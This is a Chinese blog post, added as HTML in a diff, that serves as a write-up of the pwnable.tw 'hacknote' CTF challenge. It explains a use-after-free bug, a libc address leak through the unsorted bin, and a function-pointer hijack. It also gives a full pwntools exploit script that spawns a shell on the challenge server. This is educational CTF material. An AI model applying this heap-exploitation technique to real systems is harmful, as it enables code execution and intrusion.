@@ -1,0 +1,391 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="男票带我练CTF之hacknote">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw之hacknote">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="男票带我练CTF之hacknote">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-1.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-2.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-3.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-4.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-5.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-6.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-7.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-8.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-9.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-10.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-11.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/hacknote-12.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-13.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-14.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-15.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-16.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-17.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-18.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-19.png">
+<meta property="article:published_time" content="2020-02-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-17T04:41:49.583Z">
+<meta property="article:author" content="blingbling">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="unsortedbin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/hacknote-1.png"><title>pwnable.tw之hacknote | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">pwnable.tw之hacknote</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-03-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-17</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="1-题目"   >
+          <a href="#1-题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-题目" class="headerlink" title="1 题目"></a>1 题目</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#5" >题目链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="hacknote-1.png"></p>
+<p>提供了一个二进制文件hacknote和一个库libc.so。</p>
+
+        <h1 id="2-分析"   >
+          <a href="#2-分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-分析" class="headerlink" title="2 分析"></a>2 分析</h1>
+      <p>首先分析一下这个题目的可执行程序。这是一个32bit的可执行程序，动态链接且去了符号表。该二进制程序符号表可读可写，开启了栈不可执行和canary保护，没有开启地址随机化。<br><img src="hacknote-2.png"><br>执行以下试试。如下图，该程序提供了几个功能，添加/删除/打印笔记。我们用IDA看看这些功能的实现。<br><img src="hacknote-3.png"><br>（1）add note功能<br><img src="hacknote-4.png"><br>Add操作只能执行5次。Sub_804862B函数如下，将a1+4这个地址处的指针取出，然后利用puts将该指针指向的内容进行打印。<br><img src="hacknote-5.png"><br>Chunk1和chunk2的关系如下图所示：<br><img src="hacknote-6.png"><br>（2）delete note功能（这里存在漏洞点）<br><img src="hacknote-7.png"><br>可以看到，delete函数将chunk2和chunk1释放掉后，并没有将指向各chunk的指针ptr[v1]置NULL，导致了悬空指针的产生。</p>
+<p>（3）print note功能<br><img src="hacknote-8.png"></p>
+
+        <h1 id="3-利用"   >
+          <a href="#3-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用" class="headerlink" title="3 利用"></a>3 利用</h1>
+      <blockquote>
+<p>利用主要从两个方面去考虑（以第2节中chunk1和chunk2的图为例）：<br>1、puts的内容就是chunk2中的内容，因此考虑将chunk2中的内容覆盖为我们想要的东西。如libc中某个函数的地址，这样我们就可以计算得到libc的基址，从而知道任意一个libc函数在动态执行时的地址。<br>2、chunk1的的内容部分，前四个字节是一个函数指针，如果我们能控制这个chunk的前四个字节，就可以实现任意地址执行，劫持EIP。然而chunk1的内容并非我们能轻易改动的，因此需要结合glibc的堆管理机制中存在的漏洞，使chunk1的内容变得可控，且依然满足原来可执行的特性。从这里可以看出，我们需要两个不同的对象操作同一块内容，本质就是UAF。</p>
+</blockquote>
+
+        <h2 id="3-1-获取libc基址"   >
+          <a href="#3-1-获取libc基址" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-获取libc基址" class="headerlink" title="3.1 获取libc基址"></a>3.1 获取libc基址</h2>
+      
+        <h3 id="3-1-1-本地调试时libc的基址"   >
+          <a href="#3-1-1-本地调试时libc的基址" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-1-本地调试时libc的基址" class="headerlink" title="3.1.1 本地调试时libc的基址"></a>3.1.1 本地调试时libc的基址</h3>
+      <p>本地调试时，可以在gdb中方便地获取到libc的基址，为0xf7e07000。<br><img src="hacknote-9.png"></p>
+
+        <h3 id="3-1-2-本地动态调试，获取libc中main-arena结构体中top的地址"   >
+          <a href="#3-1-2-本地动态调试，获取libc中main-arena结构体中top的地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-2-本地动态调试，获取libc中main-arena结构体中top的地址" class="headerlink" title="3.1.2 本地动态调试，获取libc中main_arena结构体中top的地址"></a>3.1.2 本地动态调试，获取libc中main_arena结构体中top的地址</h3>
+      <p><strong>Unsorted bin有一个特性，就是链表中第一个chunk的fd和bk均指向main_arena结构体中的top位置。因此只要我们泄露出这个地址，加上题目提供的libc，就可以轻松计算出libc在实际场景中的基址了。</strong></p>
+<p>首先add一个64字节的note，再add一个10字节的note，然后delete掉第一个note。此举的目的是使第一个note中大于fastbin的堆块不被top chunk给合并掉，从而该堆块可以进入unsorted bin。<br><img src="hacknote-10.png"><br>再次申请64字节的空间，堆管理器会把unsorted bin中的chunk再次分配给我们，此时index 2和index 0指向同一块堆内存区域。此时输入的内容只要不覆盖到unsorted bin中那个chunk的bk位置，就可以在成功分配后，调用print打该内存区域，获得main_arena中top的地址（地址是不可显示字符，所以显示乱码）。<br><img src="hacknote-11.png"><br><img src="/hacknote-12.png"><br><img src="hacknote-13.png"></p>
+
+        <h3 id="3-1-3-远端的libc中top相对libc基址的偏移"   >
+          <a href="#3-1-3-远端的libc中top相对libc基址的偏移" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-3-远端的libc中top相对libc基址的偏移" class="headerlink" title="3.1.3 远端的libc中top相对libc基址的偏移"></a>3.1.3 远端的libc中top相对libc基址的偏移</h3>
+      <p>Libc库中的Malloc_trim函数中存在main_arena结构体，如下图位置：<br><img src="hacknote-14.png"><br>查看main_arena在libc库中的偏移为0x001B0780。按照main_arena结构体与unsorted bin的关系（如下图），可知第一个被归档到unsorted bin的chunk，其fd与bk应当指向0x001B0780+0x30=0x001B07B0。<br><img src="hacknote-15.png"><br>因此unsorted bin中返回的值，与libc基址的偏移为0x001B07B0。</p>
+<p>那么libc_base = addr(dongtai_top) – 0x001B07B0，因此只需要用3.1.2中的方法将top的地址泄露出来，就可以计算出libc的基址啦。</p>
+
+        <h2 id="3-2-劫持EIP"   >
+          <a href="#3-2-劫持EIP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-2-劫持EIP" class="headerlink" title="3.2 劫持EIP"></a>3.2 劫持EIP</h2>
+      <blockquote>
+<p>思路：申请note时会建立chunk1（8byte）和chunk2（跟chunk1不同的大小就行），若再申请一个note，此时又会建立chunk1<code>和chunk2</code>。将这两个note删除后，chunk1和chunk1<code>会被链到同一大小（8byte）的fastbin上，chunk2和chunk2</code>会被链到其他大小的fastbin上。如果此时再申请一个8byte的note，就会将chunk1`和chunk1分别作为puts函数堆和内容堆。这个时候，chunk1被index 0和index2同时锁定。我们通过index 2 更改chunk1中的内容，然后通过index 0 去执行被替换掉的函数指针。</p>
+</blockquote>
+<p>具体操作如下：</p>
+<p>先申请两个大小为30的note，然后删除掉这两个note<br><img src="hacknote-16.png"><br>再add一个大小为8的note，此时会将fastbin上大小为8的chunk进行分配。如下图，从上往下，第一个chunk已经被写入555了。<br><img src="hacknote-17.png"><br>此时print 2得到如下结果。print 0 会报段错误，eip被覆盖成了555（即最后申请大小为8的堆时输入的content）。说明我们可以通过这种方式控制eip指针。<br><img src="hacknote-18.png"><br><img src="hacknote-19.png"></p>
+<p>EXP如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">64</span>,<span class="string">&quot;12&quot;</span>)</span><br><span class="line">add_note(<span class="number">32</span>,<span class="string">&quot;12&quot;</span>)</span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">add_note(<span class="number">64</span>,<span class="string">&quot;45&quot;</span>)</span><br><span class="line">print_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u32(io.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>]) - <span class="number">0x1b07b0</span></span><br><span class="line">sys_addr = libc_addr + mylibc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># add_note(8,&quot;12&quot;)</span></span><br><span class="line"><span class="comment"># add_note(8,&quot;34&quot;)</span></span><br><span class="line"><span class="comment"># del_note(3)</span></span><br><span class="line"><span class="comment"># del_note(4)</span></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">8</span>,p32(sys_addr)+<span class="string">&quot;;sh\x00&quot;</span>)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="4-记录"   >
+          <a href="#4-记录" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-记录" class="headerlink" title="4 记录"></a>4 记录</h1>
+      
+        <h2 id="unsorted-bin-attack"   >
+          <a href="#unsorted-bin-attack" class="heading-link"><i class="fas fa-link"></i></a><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" >https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2020/03/01/hacknote/">http://blingblingxuanxuan.github.io/2020/03/01/hacknote/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/heap/">heap</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/unsortedbin/">unsortedbin</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/03/04/startORW317/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">pwnable.tw之start-ORW-3x17</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/02/23/paper/"><span class="paginator-prev__text">ctf堆入门 - paper</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">
+          1 题目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">
+          2 分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
+          3 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E8%8E%B7%E5%8F%96libc%E5%9F%BA%E5%9D%80"><span class="toc-number">3.1.</span> <span class="toc-text">
+          3.1 获取libc基址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95%E6%97%B6libc%E7%9A%84%E5%9F%BA%E5%9D%80"><span class="toc-number">3.1.1.</span> <span class="toc-text">
+          3.1.1 本地调试时libc的基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-%E6%9C%AC%E5%9C%B0%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%EF%BC%8C%E8%8E%B7%E5%8F%96libc%E4%B8%ADmain-arena%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%ADtop%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.2.</span> <span class="toc-text">
+          3.1.2 本地动态调试，获取libc中main_arena结构体中top的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-3-%E8%BF%9C%E7%AB%AF%E7%9A%84libc%E4%B8%ADtop%E7%9B%B8%E5%AF%B9libc%E5%9F%BA%E5%9D%80%E7%9A%84%E5%81%8F%E7%A7%BB"><span class="toc-number">3.1.3.</span> <span class="toc-text">
+          3.1.3 远端的libc中top相对libc基址的偏移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E5%8A%AB%E6%8C%81EIP"><span class="toc-number">3.2.</span> <span class="toc-text">
+          3.2 劫持EIP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E8%AE%B0%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">
+          4 记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">4.1.</span> <span class="toc-text">
+          unsorted bin attack</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
